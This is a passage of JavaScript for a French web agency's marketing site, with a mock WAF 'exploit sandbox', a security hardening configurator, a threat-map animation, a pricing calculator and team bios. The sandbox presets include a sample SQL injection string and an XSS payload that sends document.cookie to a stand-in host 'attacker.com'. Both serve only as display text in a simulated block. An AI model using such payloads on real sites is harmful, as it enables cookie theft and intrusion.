          if (threatLevelEl) {
            threatLevelEl.textContent = 'NORMAL (0.02%)';
            threatLevelEl.style.color = 'var(--clr-cyan)';
          }
          if (statusText) {
            statusText.textContent = 'SYSTEM OPERATIONAL — DEFCON 4';
            statusText.style.color = 'var(--clr-green)';
          }
        }
      }, 600);
    });
  }

  // Cyber Exploit Sandbox
  const btnFire = document.getElementById('btn-fire-exploit');
  const exploitVector = document.getElementById('exploit-vector');
  const exploitPayload = document.getElementById('exploit-payload');
  const sandboxStatus = document.getElementById('sandbox-status-text');
  const wafVerdict = document.getElementById('waf-verdict');
  const wafAction = document.getElementById('waf-action');
  const wafSignature = document.getElementById('waf-signature');
  const resultBadge = document.getElementById('sandbox-result-badge');

  if (exploitVector && exploitPayload) {
    exploitVector.addEventListener('change', () => {
      const val = exploitVector.value;
      if (val === 'sqli') {
        exploitPayload.value = "' OR '1'='1' --";
      } else if (val === 'xss') {
        exploitPayload.value = "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>";
      } else if (val === 'bot') {
        exploitPayload.value = "Mozilla/5.0 (compatible; SemrushBot/7; +http://www.semrush.com/bot.html)";
      } else {
        exploitPayload.value = "";
        exploitPayload.focus();
      }
    });
    
    // Set default preset on load
    exploitPayload.value = "' OR '1'='1' --";
  }

  if (btnFire) {
    btnFire.addEventListener('click', () => {
      const payload = exploitPayload ? exploitPayload.value.trim() : '';
      if (!payload) {
        if (sandboxStatus) {
          sandboxStatus.textContent = 'Erreur: Payload vide !';
          sandboxStatus.style.color = '#EF4444';
          setTimeout(() => {
            sandboxStatus.textContent = 'Prêt à l\'envoi';
            sandboxStatus.style.color = '';
          }, 2000);
        }
        return;
      }

      btnFire.disabled = true;
      btnFire.style.opacity = '0.5';

      if (sandboxStatus) {
        sandboxStatus.textContent = 'PROBING PORT...';
        sandboxStatus.style.color = 'var(--clr-cyan)';
      }

      setTimeout(() => {
        if (sandboxStatus) {
          sandboxStatus.textContent = 'MITIGATING ATTACK VECTOR...';
          sandboxStatus.style.color = '#EF4444';
        }

        const vector = exploitVector ? exploitVector.value : 'custom';
        window.dispatchEvent(new CustomEvent('cyber-attack-start', { detail: { type: vector === 'custom' ? 'exploit' : vector } }));
        let defcon = 2;
        let sig = 'CUSTOM-9999';
        
        if (vector === 'sqli') {
          defcon = 1;
          sig = 'SQLi-9014';
        } else if (vector === 'xss') {
          defcon = 1;
          sig = 'XSS-9015';
        } else if (vector === 'bot') {
          defcon = 2;
          sig = 'BOT-8002';
        }

        // Apply visual updates to WAF cards
        if (wafVerdict) {
          wafVerdict.textContent = 'BLOCKED (Threat)';
          wafVerdict.style.color = '#EF4444';
        }
        if (wafAction) {
          wafAction.textContent = 'DROP & LOG';
          wafAction.style.color = '#EF4444';
        }
        if (wafSignature) {
          wafSignature.textContent = sig;
          wafSignature.style.color = '#EF4444';
        }
        if (resultBadge) {
          resultBadge.textContent = '● BLOCKED';
          resultBadge.style.color = '#EF4444';
        }

        // Drop DEFCON
        state.defcon = defcon;
        if (statusDot) {
          statusDot.style.backgroundColor = '#EF4444';
          statusDot.style.animation = 'pulseGlow 0.4s infinite';
        }
        if (statusText) {
          statusText.textContent = `ATTACK BLOCKED — WAF MITIGATION ENGAGED — DEFCON ${defcon}`;
          statusText.style.color = '#EF4444';
        }
        if (threatLevelEl) {
          threatLevelEl.textContent = `HIGH THREAT (${defcon === 1 ? '94.20%' : '65.80%'})`;
          threatLevelEl.style.color = '#EF4444';
        }
        if (latencyEl) {
          const badLat = 250 + Math.floor(Math.random() * 150);
          latencyEl.textContent = `${badLat}ms`;
        }

        // Log block message
        const site = sites[Math.floor(Math.random() * sites.length)];
        const time = getFormattedTime();
        const blockMsg = `Exploitation attempt blocked by Edge Web Application Firewall (WAF) rule WAF-9421. Payload: ${payload}`;
        createAndStoreLog('BLOCKED', blockMsg);
        renderLogs();

        // Push spike in the chart
        state.chartData.shift();
        state.chartData.push(350 + Math.floor(Math.random() * 100));
        drawChart();

        // Restore everything after 3.5 seconds
        setTimeout(() => {
          if (sandboxStatus) {
            sandboxStatus.textContent = 'Prêt à l\'envoi';
            sandboxStatus.style.color = '';
          }
          if (wafVerdict) {
            wafVerdict.textContent = 'PASS (Légitime)';
            wafVerdict.style.color = 'var(--clr-green)';
          }
          if (wafAction) {
            wafAction.textContent = 'MONITOR ONLY';
            wafAction.style.color = 'var(--clr-text-3)';
          }
          if (wafSignature) {
            wafSignature.textContent = 'NONE (0x000)';
            wafSignature.style.color = 'var(--clr-text-3)';
          }
          if (resultBadge) {
            resultBadge.textContent = '● SHIELD ON';
            resultBadge.style.color = 'var(--clr-green)';
          }

          state.defcon = 4;
          if (statusDot) {
            statusDot.style.backgroundColor = 'var(--clr-green)';
            statusDot.style.animation = 'pulseGlow 1.5s infinite';
          }
          if (statusText) {
            statusText.textContent = 'SYSTEM OPERATIONAL — DEFCON 4';
            statusText.style.color = 'var(--clr-green)';
          }
          if (threatLevelEl) {
            threatLevelEl.textContent = 'NORMAL (0.02%)';
            threatLevelEl.style.color = 'var(--clr-cyan)';
          }

          // Restore normal latency display
          if (latencyEl) {
            latencyEl.textContent = '82ms';
          }

          // Log recovery
          createAndStoreLog('INFO', '[MITIGATION RESULT] Attack mitigated successfully. Threat signature quarantined. Edge networks stabilized.');
          renderLogs();

          btnFire.disabled = false;
          btnFire.style.opacity = '1';
          window.dispatchEvent(new CustomEvent('cyber-attack-end'));
        }, 3500);

      }, 800);
    });
  }

  // Active loop for live logs & counters
  function runLoop() {
    if (!state.isDdosActive) {
      createAndStoreLog();
      renderLogs();

      // Normal graph progression
      state.chartData.shift();
      state.chartData.push(85 + Math.floor(Math.random() * 65));
      drawChart();
    }

    // Fluctuating traffic & latency
    state.traffic24h += Math.floor(Math.random() * 4) + 1;
    if (trafficEl) trafficEl.textContent = state.traffic24h.toLocaleString();

    if (latencyEl) {
      const lat = Math.floor(Math.random() * 8) + 79;
      latencyEl.textContent = `${lat}ms`;
    }

    // Update hardware resources
    updateSystemResources();

    // Slightly increment client site visits
    const luckySite = sites[Math.floor(Math.random() * sites.length)];
    luckySite.visits += Math.floor(Math.random() * 2) + 1;
    if (luckySite.el) {
      luckySite.el.textContent = `${luckySite.visits.toLocaleString()} visits`;
    }

    // Schedule next log
    const nextMs = state.isDdosActive ? 1500 : (Math.floor(Math.random() * 1500) + 1500);
    setTimeout(runLoop, nextMs);
  }

  // Initial runs
  updateThreatDistribution(45, 25, 20, 10);
  drawChart();
  setTimeout(runLoop, 1500);
})();

// Insert Hardening Simulator and Cyber Threat Map engines
// ═══════════════════════════════════════════════
// 14b. INTERACTIVE HARDENING CONFIGURATOR
// ═══════════════════════════════════════════════
function initHardeningSimulator() {
  const container = document.getElementById('hardening');
  if (!container) return;

  const switches = {
    hsts: document.getElementById('switch-hsts'),
    csp: document.getElementById('switch-csp'),
    tls: document.getElementById('switch-tls'),
    dnssec: document.getElementById('switch-dnssec'),
    waf: document.getElementById('switch-waf'),
    mfa: document.getElementById('switch-mfa')
  };

  const scorePctEl = document.getElementById('hardening-score-pct');
  const radialBar = document.getElementById('hardening-radial-bar');
  const threatLevelEl = document.getElementById('hardening-threat-level');
  const slaEl = document.getElementById('hardening-sla');
  const explainTitle = document.getElementById('explain-title');
  const explainDesc = document.getElementById('explain-desc');

  const layersInfo = {
    hsts: {
      title: "HSTS (Strict Transport Security)",
      desc: "Sécurise les communications en instruisant les navigateurs de ne communiquer qu'en HTTPS. Bloque l'exploitation de failles d'interception de type Man-in-the-Middle (MitM) et prévient les attaques de downgrade SSL."
    },
    csp: {
      title: "CSP (Content Security Policy) Stricte",
      desc: "Définit les sources fiables pour l'exécution de scripts, d'images et de styles. Neutralise totalement l'injection de scripts malveillants (Cross-Site Scripting - XSS) et l'inclusion de frames frauduleuses."
    },
    tls: {
      title: "TLS 1.3 & Chiffrement Fort",
      desc: "Assure que tous les échanges de données utilisent des algorithmes de chiffrement de pointe (ChaCha20, AES-GCM). Accélère le handshake TLS et protège les sessions contre le décodage rétroactif."
    },
    dnssec: {
      title: "DNSSEC (DNS Security Extensions)",
      desc: "Signe cryptographiquement les enregistrements DNS de votre domaine. Empêche l'empoisonnement de cache DNS, le détournement de trafic et la redirection transparente de vos utilisateurs vers des sites clones."
    },
    waf: {
      title: "Cloudflare WAF Enterprise",
      desc: "Analyse le trafic réseau mondial en temps réel au niveau des serveurs Edge de Cloudflare. Identifie et neutralise instantanément les requêtes malveillantes (DDoS, injections SQL, Scrapers, Zero-day) avant qu'elles ne touchent votre infrastructure."
    },
    mfa: {
      title: "Double Authentification (MFA) Admin",
      desc: "Verrouille les accès aux consoles d'administration Supabase et d'hébergement. Exige une validation matérielle ou logicielle (OTP, clé FIDO2), bloquant 99,9% des tentatives de compromission d'identifiants."
    }
  };

  let activeHoverLayer = null;

  function updateHardeningScore() {
    let score = 40;
    
    Object.keys(switches).forEach(key => {
      const sw = switches[key];
      if (sw && sw.checked) {
        score += 10;
        const card = sw.closest('.hardening-switch-card');
        if (card) card.classList.add('active');
      } else {
        const swElement = switches[key];
        if (swElement) {
          const card = swElement.closest('.hardening-switch-card');
          if (card) card.classList.remove('active');
        }
      }
    });

    if (score > 100) score = 100;

    if (scorePctEl) scorePctEl.textContent = `${score}%`;

    if (radialBar) {
      const offset = 276 - (276 * score / 100);
      radialBar.style.strokeDashoffset = offset;
    }

    if (threatLevelEl) {
      if (score === 40) {
        threatLevelEl.textContent = "Critique 🚨";
        threatLevelEl.style.color = "#EF4444";
      } else if (score <= 60) {
        threatLevelEl.textContent = "Élevée ⚠️";
        threatLevelEl.style.color = "#F97316";
      } else if (score <= 80) {
        threatLevelEl.textContent = "Moyenne ⚡";
        threatLevelEl.style.color = "#FBBF24";
      } else if (score <= 90) {
        threatLevelEl.textContent = "Faible 🛡️";
        threatLevelEl.style.color = "var(--clr-cyan)";
      } else {
        threatLevelEl.textContent = "Nulle 🛡️";
        threatLevelEl.style.color = "var(--clr-green)";
      }
    }

    if (slaEl) {
      if (score <= 60) {
        slaEl.textContent = "Standard";
      } else if (score <= 80) {
        slaEl.textContent = "Avancé";
      } else {
        slaEl.textContent = "Critique (SLA 99.99%)";
      }
    }
  }

  function showExplanation(key) {
    const info = layersInfo[key];
    if (!info || !explainTitle || !explainDesc) return;
    explainTitle.textContent = info.title;
    explainDesc.textContent = info.desc;
  }

  function resetExplanation() {
    if (activeHoverLayer) {
      showExplanation(activeHoverLayer);
    } else {
      const checkedKeys = Object.keys(switches).filter(key => switches[key] && switches[key].checked);
      if (checkedKeys.length > 0) {
        showExplanation(checkedKeys[0]);
      } else {
        explainTitle.textContent = "Sélectionnez un protocole";
        explainDesc.textContent = "Survolez ou activez les commutateurs pour obtenir des informations cyber détaillées.";
      }
    }
  }

  Object.keys(switches).forEach(key => {
    const sw = switches[key];
    if (!sw) return;

    const card = sw.closest('.hardening-switch-card');
    if (!card) return;

    card.addEventListener('click', (e) => {
      if (e.target.tagName !== 'INPUT' && !e.target.closest('.cyber-switch')) {
        sw.checked = !sw.checked;
        sw.dispatchEvent(new Event('change'));
      }
    });

    sw.addEventListener('change', () => {
      updateHardeningScore();
      showExplanation(key);
      activeHoverLayer = key;
    });

    card.addEventListener('mouseenter', () => {
      showExplanation(key);
    });

    card.addEventListener('mouseleave', () => {
      resetExplanation();
    });

    sw.addEventListener('focus', () => {
      showExplanation(key);
    });
    sw.addEventListener('blur', () => {
      resetExplanation();
    });
  });

  updateHardeningScore();
  resetExplanation();
}

// ═══════════════════════════════════════════════
// 14c. CYBER THREAT MAP ENGINE (SOC VISUALS)
// ═══════════════════════════════════════════════
function initCyberThreatMap() {
  const canvas = document.getElementById('threat-map-canvas');
  if (!canvas) return;

  const ctx = canvas.getContext('2d');
  if (!ctx) return;

  let w, h;
  function resize() {
    w = canvas.width = canvas.offsetWidth;
    h = canvas.height = canvas.offsetHeight;
  }
  
  resize();
  window.addEventListener('resize', resize, { passive: true });

  const nodes = [
    { name: 'PARIS (HQ)', x: 0.50, y: 0.42, isHQ: true },
    { name: 'NEW YORK', x: 0.20, y: 0.35 },
    { name: 'SÃO PAULO', x: 0.28, y: 0.70 },
    { name: 'MOSCOW', x: 0.65, y: 0.28 },
    { name: 'BEIJING', x: 0.82, y: 0.38 },
    { name: 'TOKYO', x: 0.90, y: 0.40 },
    { name: 'SYDNEY', x: 0.88, y: 0.80 }
  ];

  let packets = [];
  let activeAttack = null;
  let shieldRipples = [];

  window.addEventListener('cyber-attack-start', (e) => {
    const attackType = e.detail.type;
    let sourceNode = nodes[3]; // MOSCOW as default
    if (attackType === 'bot') {
      sourceNode = nodes[4]; // BEIJING
    } else if (attackType === 'ddos') {
      sourceNode = nodes[2]; // SÃO PAULO
    } else if (attackType === 'sqli') {
      sourceNode = nodes[3]; // MOSCOW
    } else if (attackType === 'exploit') {
      sourceNode = nodes[5]; // TOKYO
    }

    activeAttack = {
      source: sourceNode,
      type: attackType,
      startTime: Date.now(),
      intensity: 1.0,
      packetsSpawned: 0
    };

    const hud = document.getElementById('active-attack-hud');
    if (hud) {
      hud.textContent = `WARNING: ACTIVE ${attackType.toUpperCase()} ATTACK INTERCEPTED`;
      hud.style.display = 'block';
    }
  });

  window.addEventListener('cyber-attack-end', () => {
    activeAttack = null;
    const hud = document.getElementById('active-attack-hud');
    if (hud) {
      hud.style.display = 'none';
    }
  });

  function getControlPoint(p0, p2, curveOffset) {
    const midX = (p0.x + p2.x) / 2;
    const midY = (p0.y + p2.y) / 2;
    return {
      x: midX,
      y: midY + curveOffset
    };
  }

  function getBezierPoint(p0, p1, p2, t) {
    const x = (1 - t) * (1 - t) * p0.x + 2 * (1 - t) * t * p1.x + t * t * p2.x;
    const y = (1 - t) * (1 - t) * p0.y + 2 * (1 - t) * t * p1.y + t * t * p2.y;
    return { x, y };
  }

  function spawnStandardPacket() {
    const sourceIdx = Math.floor(Math.random() * (nodes.length - 1)) + 1;
    const fromNode = nodes[sourceIdx];
    const toNode = nodes[0]; // PARIS

    const p0 = { x: fromNode.x * w, y: fromNode.y * h };
    const p2 = { x: toNode.x * w, y: toNode.y * h };
    const curveOffset = -40 - Math.random() * 40;
    const p1 = getControlPoint(p0, p2, curveOffset);

    packets.push({
      p0, p1, p2,
      t: 0,
      speed: 0.003 + Math.random() * 0.005,
      color: 'rgba(0, 212, 255, 0.7)',
      size: 1.5 + Math.random() * 1.5,
      isAttack: false
    });
  }

  function spawnAttackPacket() {
    if (!activeAttack) return;
    const fromNode = activeAttack.source;
    const toNode = nodes[0]; // PARIS

    const p0 = { x: fromNode.x * w, y: fromNode.y * h };
    const p2 = { x: toNode.x * w, y: toNode.y * h };
    const curveOffset = -30 - Math.random() * 30;
    const p1 = getControlPoint(p0, p2, curveOffset);

    packets.push({
      p0, p1, p2,
      t: 0,
      speed: 0.015 + Math.random() * 0.015,
      color: 'rgba(239, 68, 68, 0.95)',
      size: 2.5 + Math.random() * 2,
      isAttack: true
    });
  }

  function drawHQShield(hqX, hqY) {
    ctx.strokeStyle = 'rgba(0, 212, 255, 0.4)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.arc(hqX, hqY, 14, 0, Math.PI * 2);
    ctx.stroke();

    shieldRipples.forEach((ripple, idx) => {
      ripple.r += 0.8;
      ripple.alpha -= 0.015;
      if (ripple.alpha <= 0) {
        shieldRipples.splice(idx, 1);
        return;
      }
      ctx.strokeStyle = ripple.isAttack 
        ? `rgba(239, 68, 68, ${ripple.alpha})`
        : `rgba(0, 212, 255, ${ripple.alpha})`;
      ctx.lineWidth = ripple.isAttack ? 2.5 : 1.5;
      ctx.beginPath();
      ctx.arc(hqX, hqY, ripple.r, 0, Math.PI * 2);
      ctx.stroke();
    });
  }

  function loop() {
    ctx.fillStyle = 'rgba(1, 4, 10, 0.18)';
    ctx.fillRect(0, 0, w, h);

    ctx.strokeStyle = 'rgba(0, 212, 255, 0.03)';
    ctx.lineWidth = 0.5;
    const gridSize = 30;
    for (let x = 0; x < w; x += gridSize) {
      ctx.beginPath();
      ctx.moveTo(x, 0);
      ctx.lineTo(x, h);
      ctx.stroke();
    }
    for (let y = 0; y < h; y += gridSize) {
      ctx.beginPath();
      ctx.moveTo(0, y);
      ctx.lineTo(w, y);
      ctx.stroke();
    }

    ctx.fillStyle = 'rgba(0, 212, 255, 0.25)';
    ctx.font = '8px monospace';
    ctx.fillText('SYS_OBSERVABILITY_ON', 15, 20);
    ctx.fillText('LATENCY_ALERT_G_PASS', w - 110, 20);

    const hqCoord = { x: nodes[0].x * w, y: nodes[0].y * h };

    if (packets.length < 16 && Math.random() < 0.06) {
      spawnStandardPacket();
    }

    if (activeAttack) {
      const spawnRate = activeAttack.type === 'ddos' ? 3 : 1;
      for (let i = 0; i < spawnRate; i++) {
        if (Math.random() < 0.6) {
          spawnAttackPacket();
        }
      }
    }

    nodes.forEach(node => {
      if (node.isHQ) return;
      const p0 = { x: node.x * w, y: node.y * h };
      const p2 = hqCoord;
      const curveOffset = -40;
      const p1 = getControlPoint(p0, p2, curveOffset);

      ctx.strokeStyle = 'rgba(0, 212, 255, 0.04)';
      ctx.lineWidth = 1;
      ctx.beginPath();
      ctx.moveTo(p0.x, p0.y);
      ctx.quadraticCurveTo(p1.x, p1.y, p2.x, p2.y);
      ctx.stroke();
    });

    if (activeAttack) {
      const fromNode = activeAttack.source;
      const p0 = { x: fromNode.x * w, y: fromNode.y * h };
      const p2 = hqCoord;
      const curveOffset = -30;
      const p1 = getControlPoint(p0, p2, curveOffset);

      const pulseAlpha = 0.25 + 0.15 * Math.sin(Date.now() / 150);
      ctx.strokeStyle = `rgba(239, 68, 68, ${pulseAlpha})`;
      ctx.lineWidth = 2.5;
      ctx.beginPath();
      ctx.moveTo(p0.x, p0.y);
      ctx.quadraticCurveTo(p1.x, p1.y, p2.x, p2.y);
      ctx.stroke();

      const alertAlpha = 0.08 + 0.06 * Math.sin(Date.now() / 80);
      ctx.fillStyle = `rgba(239, 68, 68, ${alertAlpha})`;
      ctx.fillRect(0, 0, w, h);

      ctx.fillStyle = `rgba(239, 68, 68, ${0.4 + 0.4 * Math.sin(Date.now() / 120)})`;
      ctx.font = 'bold 9px monospace';
      ctx.textAlign = 'center';
      ctx.fillText(`WAF BLOCKED: ${activeAttack.type.toUpperCase()} THREAT FROM ${activeAttack.source.name}`, w / 2, 45);
      ctx.textAlign = 'left';
    }

    for (let i = packets.length - 1; i >= 0; i--) {
      const p = packets[i];
      p.t += p.speed;

      if (p.t >= 1) {
        shieldRipples.push({
          r: 14,
          alpha: 0.6,
          isAttack: p.isAttack
        });
        packets.splice(i, 1);
        continue;
      }

      const pos = getBezierPoint(p.p0, p.p1, p.p2, p.t);

      ctx.fillStyle = p.color;
      ctx.beginPath();
      ctx.arc(pos.x, pos.y, p.size, 0, Math.PI * 2);
      ctx.fill();

      if (p.isAttack) {
        ctx.fillStyle = 'rgba(239, 68, 68, 0.3)';
        ctx.beginPath();
        const prevPos = getBezierPoint(p.p0, p.p1, p.p2, Math.max(0, p.t - 0.04));
        ctx.arc(prevPos.x, prevPos.y, p.size * 0.7, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    nodes.forEach(node => {
      const cx = node.x * w;
      const cy = node.y * h;

      if (node.isHQ) {
        ctx.fillStyle = 'var(--clr-cyan)';
        ctx.beginPath();
        ctx.arc(cx, cy, 5, 0, Math.PI * 2);
        ctx.fill();

        ctx.strokeStyle = 'var(--clr-cyan)';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.arc(cx, cy, 9, 0, Math.PI * 2);
        ctx.stroke();

        ctx.fillStyle = 'rgba(0, 212, 255, 0.8)';
        ctx.font = 'bold 8px monospace';
        ctx.fillText(node.name, cx - 35, cy - 18);
        
        drawHQShield(cx, cy);
      } else {
        const isTargeted = activeAttack && activeAttack.source.name === node.name;
        
        ctx.fillStyle = isTargeted ? '#EF4444' : 'rgba(0, 212, 255, 0.4)';
        ctx.beginPath();
        ctx.arc(cx, cy, isTargeted ? 4 : 2.5, 0, Math.PI * 2);
        ctx.fill();

        if (isTargeted) {
          ctx.strokeStyle = '#EF4444';
          ctx.lineWidth = 1;
          ctx.beginPath();
          ctx.arc(cx, cy, 7 + Math.sin(Date.now() / 100) * 3, 0, Math.PI * 2);
          ctx.stroke();
        }

        ctx.fillStyle = isTargeted ? '#F87171' : 'rgba(255, 255, 255, 0.35)';
        ctx.font = '7.5px monospace';
        ctx.fillText(node.name, cx - 25, cy - 8);
      }
    });

    requestAnimationFrame(loop);
  }

  loop();
}

console.log('%c⬡ ARKIS AGENCY', 'color:#00D4FF;font-family:monospace;font-size:18px;font-weight:bold;');
console.log('%cSecure by Design. Impénétrable par conception.', 'color:#94A3B8;font-family:monospace;font-size:12px;');

// ═══════════════════════════════════════════════
// 15. INTERACTIVE CYBER ROI & BUDGET SIMULATOR
// ═══════════════════════════════════════════════
function initPricingCalculator() {
  const pagesSlider = document.getElementById('sim-pages');
  const pagesVal = document.getElementById('sim-pages-val');
  const dbCheckbox = document.getElementById('sim-db');
  const securitySelect = document.getElementById('sim-security');
  const supportSelect = document.getElementById('sim-support');

  const buildPriceEl = document.getElementById('sim-build-price');
  const runPriceEl = document.getElementById('sim-run-price');
  const lcpEl = document.getElementById('sim-lcp-val');
  const securityValEl = document.getElementById('sim-security-val');
  const quoteBtn = document.getElementById('sim-quote-btn');

  if (!pagesSlider || !pagesVal || !dbCheckbox || !securitySelect || !supportSelect || !buildPriceEl || !runPriceEl || !lcpEl || !securityValEl || !quoteBtn) return;

  function calculate() {
    const pages = parseInt(pagesSlider.value, 10);
    const db = dbCheckbox.checked;
    const security = securitySelect.value;
    const support = supportSelect.value;

    // Update slider label
    pagesVal.textContent = `${pages} page${pages > 1 ? 's' : ''}`;

    // 1. Build Price
    let buildPrice = 2000;
    if (pages > 5) {
      buildPrice += (pages - 5) * 150;
    }
    if (db) {
      buildPrice += 1500;
    }
    if (security === 'advanced') {
      buildPrice += 800;
    } else if (security === 'enterprise') {
      buildPrice += 2500;
    }

    // 2. Run Price (Monthly)
    let runPrice = 29;
    if (db) {
      runPrice += 50;
    }
    if (security === 'advanced') {
      runPrice += 120;
    } else if (security === 'enterprise') {
      runPrice += 290;
    }

    if (support === 'essentiel') {
      runPrice += 149;
    } else if (support === 'business') {
      runPrice += 349;
    } else if (support === 'critique') {
      runPrice += 890;
    }

    // 3. Performance Metric (LCP Score)
    let lcpScore = 100;
    if (db) lcpScore -= 5;
    if (pages > 15) lcpScore -= 3;
    if (security === 'advanced' || security === 'enterprise') {
      lcpScore += 2;
    }
    if (lcpScore > 100) lcpScore = 100;

    // 4. Security Grade
    let securityGrade = 'Grade B';
    if (security === 'advanced') securityGrade = 'Grade A';
    if (security === 'enterprise') securityGrade = 'Grade AA';
    if (db) {
      securityGrade += (security === 'enterprise') ? '++' : '+';
    }

    // Update UI Elements
    buildPriceEl.textContent = buildPrice.toLocaleString();
    runPriceEl.textContent = runPrice.toLocaleString();
    
    lcpEl.textContent = `${lcpScore} / 100`;
    if (lcpScore >= 95) {
      lcpEl.style.color = 'var(--clr-green)';
    } else if (lcpScore >= 90) {
      lcpEl.style.color = 'var(--clr-cyan)';
    } else {
      lcpEl.style.color = '#FBBF24';
    }

    securityValEl.textContent = securityGrade;
    if (security === 'enterprise') {
      securityValEl.style.color = '#C084FC';
    } else if (security === 'advanced') {
      securityValEl.style.color = 'var(--clr-cyan)';
    } else {
      securityValEl.style.color = 'var(--clr-text-3)';
    }

    // Update Quote Link with parameters
    const budgetRange = buildPrice < 3000 ? '<3k' : buildPrice <= 7000 ? '3-7k' : buildPrice <= 15000 ? '7-15k' : '15k+';
    const message = `Bonjour Arkis, suite à ma simulation sur votre site, voici mon besoin :
- Volume : ${pages} pages
- Base de données Supabase PostgreSQL : ${db ? 'Oui (Sécurité RLS active)' : 'Non'}
- Bouclier de sécurité Cloudflare WAF : ${security === 'basic' ? 'Standard Edge CDN' : security === 'advanced' ? 'Advanced WAF & DDoS' : 'Zero-Trust Enterprise Vault'}
- Support & Maintenance RUN : ${support === 'none' ? 'Aucun' : support === 'essentiel' ? 'Essentiel (149€/mois)' : support === 'business' ? 'Business 24/7 (349€/mois)' : 'Critique SLA 99.99% (890€/mois)'}

Estimation de l'infrastructure :
- Phase 1 (BUILD) : ${buildPrice.toLocaleString()} € (coût unique)
- Phase 2 (RUN) : ${runPrice.toLocaleString()} € / mois

Merci de reprendre contact pour valider l'architecture.`;

    quoteBtn.href = `/contact?service=web&budget=${budgetRange}&message=${encodeURIComponent(message)}`;
  }

  // Bind Listeners
  pagesSlider.addEventListener('input', calculate);
  dbCheckbox.addEventListener('change', calculate);
  securitySelect.addEventListener('change', calculate);
  supportSelect.addEventListener('change', calculate);

  // Initial calculation
  calculate();
}

// ═══════════════════════════════════════════════
// 16. CONTACT FORM AUTO-FILLER FROM URL PARAMS
// ═══════════════════════════════════════════════
function handleContactPreFill() {
  const urlParams = new URLSearchParams(window.location.search);
  const service = urlParams.get('service');
  const budget = urlParams.get('budget');
  const message = urlParams.get('message');

  const serviceSelect = document.getElementById('contact-service');
  const budgetSelect = document.getElementById('contact-budget');
  const messageTextarea = document.getElementById('contact-message');

  if (service && serviceSelect) {
    serviceSelect.value = service;
  }
  if (budget && budgetSelect) {
    budgetSelect.value = budget;
  }
  if (message && messageTextarea) {
    messageTextarea.value = message;
  }
}

// ═══════════════════════════════════════════════
// 17. FOUNDERS & TEAM BIOGRAPHIC SIDEBAR MODAL
// ═══════════════════════════════════════════════
function initTeamModals() {
  const drawer = document.getElementById('bio-drawer');
  const overlay = document.getElementById('bio-drawer-overlay');
  const pane = document.getElementById('bio-drawer-pane');
  const closeBtn = document.getElementById('bio-drawer-close');
  const content = document.getElementById('bio-drawer-content');
  const triggers = document.querySelectorAll('.btn-bio-trigger');

  if (!drawer || !overlay || !pane || !closeBtn || !content || triggers.length === 0) return;

  const bios = {
    mathisducarois: {
      initials: 'MD',
      name: 'Mathis Ducarois',
      role: 'Lead Architecte Web & Expert en Cybersécurité',
      color: 'var(--clr-cyan)',
      bio: "Mathis est l'architecte principal d'Arkis. Spécialisé dans le développement front-end et back-end ultra-performant et les architectures Jamstack modernes (Astro, Next.js), il couple ses compétences logicielles avec une expertise poussée en cybersécurité pour concevoir des applications web aussi rapides que blindées. Il s'assure que chaque ligne de code est optimisée pour la vitesse, le SEO et la résilience opérationnelle. Il garantit notre score de 100/100 LCP.",
      experience: "Plus de 2 ans d'expérience dans l'ingénierie logicielle pour des startups technologiques et des plateformes e-commerce à forte charge.",
      certs: ['AWS Certified Solutions Architect', 'Google UX Design Professional', 'Certified DevSecOps Professional'],
      skills: ['React / Next.js', 'Astro / JAMstack', 'Supabase (PostgreSQL)', 'Edge Workers & CDNs', 'TypeScript / Node.js']
    },
    lucasbataille: {
      initials: 'LB',
      name: 'Lucas Bataille',
      role: 'Co-Fondateur & Expert Cybersécurité',
      color: '#A78BFA',
      bio: "Lucas dirige la division cybersécurité offensive (Pen-testing, Red Team / Blue Team) chez Arkis. Titulaire de la prestigieuse certification OSCP, il passe son temps à attaquer nos propres infrastructures et architectures logicielles avant la mise en production. Spécialisé dans la neutralisation active des vecteurs d'exploit et le déploiement de pare-feu applicatifs (WAF) avancés, il veille à ce que vos données restent totalement inviolables.",
      experience: "Ancien auditeur de sécurité senior pour des cabinets accrédités par l'ANSSI et chercheur de vulnérabilités indépendant (Bug Bounty).",
      certs: ['OSCP (Offensive Security Certified Professional)', 'CEH (Certified Ethical Hacker)', 'ISO 27001 Lead Implementer'],
      skills: ['Pen-Testing Applicatif', 'WAF Architecture', 'Audits OWASP Top 10', 'Zero-Trust Networks', 'SIEM & SOC Engineering']
    }
  };

  function openDrawer(bioKey) {
    const data = bios[bioKey];
    if (!data) return;

    content.innerHTML = `
      <div style="display: flex; flex-direction: column; align-items: center; text-align: center; margin-top: 1rem;">
        <div style="width: 80px; height: 80px; background: rgba(255,255,255,0.02); border: 2px solid ${data.color}; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative; margin-bottom: 1.25rem;">
          <span style="font-family: var(--font-display); font-size: 1.65rem; font-weight: 800; color: ${data.color};">${data.initials}</span>
        </div>
        <h3 style="font-size: 1.5rem; font-weight: 800; color: var(--clr-text); margin-bottom: 0.25rem;">${data.name}</h3>
        <span class="font-mono" style="font-size: 0.75rem; color: ${data.color}; text-transform: uppercase; letter-spacing: 0.05em;">${data.role}</span>
      </div>

      <div style="border-top: 1px solid rgba(255,255,255,0.05); padding-top: 1.5rem;">
        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Biographie</h4>
        <p style="font-size: 0.9rem; color: var(--clr-text-2); line-height: 1.6;">${data.bio}</p>
      </div>

      <div>
        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Parcours & Expérience</h4>
        <p style="font-size: 0.9rem; color: var(--clr-text-2); line-height: 1.6;">${data.experience}</p>
      </div>

      <div>
        <h4 class="font-mono" style="font-size: 0.72rem; color: var(--clr-text-3); text-transform: uppercase; margin-bottom: 0.75rem; letter-spacing: 0.05em;">Compétences Clés</h4>
        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
          ${data.skills.map(s => `<span style="font-size: 0.72rem; background: rgba(255,255,255,0.03); border: 1px solid var(--clr-border); padding: 0.2rem 0.6rem; border-radius: 6px; color: var(--clr-text-2);">${s}</span>`).join('')}
        </div>
      </div>

      <div style="border-top: 1px solid rgba(255,255,255,0.05); padding-top: 1.5rem; margin-bottom: 2rem;">
